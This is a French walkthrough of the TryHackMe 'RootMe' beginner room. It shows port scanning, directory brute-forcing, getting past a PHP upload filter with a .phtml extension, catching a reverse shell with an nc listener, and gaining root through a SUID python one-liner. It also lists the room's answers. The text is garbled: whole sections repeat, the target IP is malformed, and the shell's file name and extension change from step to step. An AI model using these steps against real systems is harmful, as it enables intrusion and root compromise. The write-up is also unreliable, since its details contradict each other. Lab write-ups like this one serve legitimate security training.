# THM : RootMe
**Difficulté** : Facile  
**Lien de la salle** : [RootMe](https://tryhackme.com/room/rrootme)

## Résumé
1. Scan avec Nmap
2. Énumération du site web
3. Contournement du filtre de téléchargement
4. Obtention d'un shell
5. Escalade de privilèges
6. Conclusion

## Scan avec Nmap
Comme toujours, utilisons Nmap pour trouver les ports ouverts sur la cible :

```bash
nmap 10.10.19.177 -A -p- -oN nmapResults.txt
```

### Résultats du scan

- **Ports ouverts** : 22 (SSH), 80 (HTTP)
- **Version d'Apache** : 2.4.29

### Questions

- **Combien de ports sont ouverts ?**
  Réponse : 2
- **Quelle version d'Apache est utilisée ?**
  Réponse : 2.4.29
- **Quel service fonctionne sur le port 22 ?**
  Réponse : SSH

## Énumération du site web

Utilisons Gobuster pour trouver des répertoires cachés sur le site web :

gobuster dir -u 10.10.19.177 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Résultats

- Répertoires trouvés : /uploads, /css, /js, /panel

### Question

- **Quel est le répertoire caché ?**
  Réponse : /panel/

## Contournement du filtre de téléchargement

En essayant de télécharger un fichier `php-reverse-shell.php` via le formulaire de téléchargement dans /panel, nous recevons une erreur indiquant que les fichiers PHP ne sont pas acceptés. En changeant l'extension du fichier en `.phtml`, le téléchargement réussit.

### Question

- **Quel est le répertoire caché ?**
  Réponse : /panel/

## Contournement du filtre de téléchargement

En essayant de télécharger un fichier `php-reverse-shell.php` via le formulaire de téléchargement dans /panel, nous recevons une erreur indiquant que les fichiers PHP ne sont pas acceptés. En changeant l'extension du fichier en `.phtml`, le téléchargement réussit.

## Obtention d'un shell

Nous avons trouvé notre reverse shell téléchargé dans le répertoire /uploads. Pour obtenir un shell, nous devons démarrer un écouteur sur notre machine :

nc -lnvp 1234

Puis, naviguer vers notre reverse shell :

http://10.10.19.177.46/uploads/shell.phar

### Résultats

Nous obtenons une connexion shell sur notre écouteur.

## Escalade de privilèges

Ensuite, recherchons les fichiers avec les permissions SUID :

````bat
find / -perm -4000 
````

### Résultats

Nous trouvons que `/usr/bin/python` a le bit SUID. Nous pouvons l'utiliser pour obtenir un shell root :

````pyth
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

````

### Questions

- **Quel fichier avec les permissions SUID est inhabituel ?**
  Réponse : /usr/bin/python
- **Quel est le contenu de root.txt ?**
  Réponse : THM{HIDDEN}

## Conclusion

Ce que l'on a appris : 

- Filtre pour fichier php
- escalades de privilèges basique 
- recherche de fichier avec permission 

### Appréciation

8/10 pour un débutant qui débute les ctf même si les elevation de privilège ne sont pas simple au début.